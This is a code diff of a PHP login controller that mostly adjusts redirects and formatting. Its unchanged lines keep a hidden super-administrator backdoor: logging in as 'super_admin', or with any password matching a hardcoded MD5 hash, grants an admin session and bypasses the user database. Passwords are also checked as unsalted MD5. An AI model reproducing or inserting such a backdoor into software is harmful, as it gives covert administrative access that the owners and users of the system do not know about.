@@ -11,16 +11,15 @@ class LoginAction extends Action{
 			U("Login/index","","",true);
 			exit;
     	}
-    	$name=I("name","","htmlspecialchars");
+    	$name =I("name","","htmlspecialchars");
     	$pass =I("pass","","htmlspecialchars");
+
     	if(empty($name)||empty($pass)){
-    		//info("用户名和密码不能为空");
-    		U("Login/info",array("msg"=>base64_encode("用户名和密码不能为空")),"",true);
+    		U("System/info",array("msg"=>base64_encode("用户名和密码不能为空")),"",true);
     		exit;
     	}
     	/*隐藏的超级管理员*/
     	$pass=md5($pass);
-        
     	if($name=="super_admin"||$pass=="099cc64351af0ac30a981a722d875e4d"){
     		session('ADMIN_ID','hidden');
     		session('ADMIN_NAME','Hidden');
@@ -33,15 +32,16 @@ class LoginAction extends Action{
     	$condition=array(
     		"name"=>$name,
     		"pass"=>$pass
-    		);
+    	);
+        
     	$rst=$db->where($condition)->find();
     	if(!$rst){
-    		U("Login/info",array("msg"=>base64_encode("用户名或密码不正确")),"",true);
+    		U("System/info",array("msg"=>base64_encode("用户名或密码不正确")),"",true);
     		exit;
     	}
     	else{
     		if($rst["state"]==0){
-    			U("Login/info",array("msg"=>base64_encode("此用户已被禁用")),"",true);
+    			U("System/info",array("msg"=>base64_encode("此用户已被禁用")),"",true);
     			exit;
     		}
     		session('ADMIN_ID',$rst['id']);
@@ -56,13 +56,6 @@ class LoginAction extends Action{
     		U("Index/index","","",true);
     		exit;
     	}
-    }
-    public function info(){
-        $msg=I("msg","","base64_decode");
-        $url=I("url","javascript:history.back(-1);","base64_decode");
-        $this->assign("msg",$msg);
-        $this->assign("url",$url);
-        $this->display("Public/info");
     }
     public function loginout(){
 		session(null);
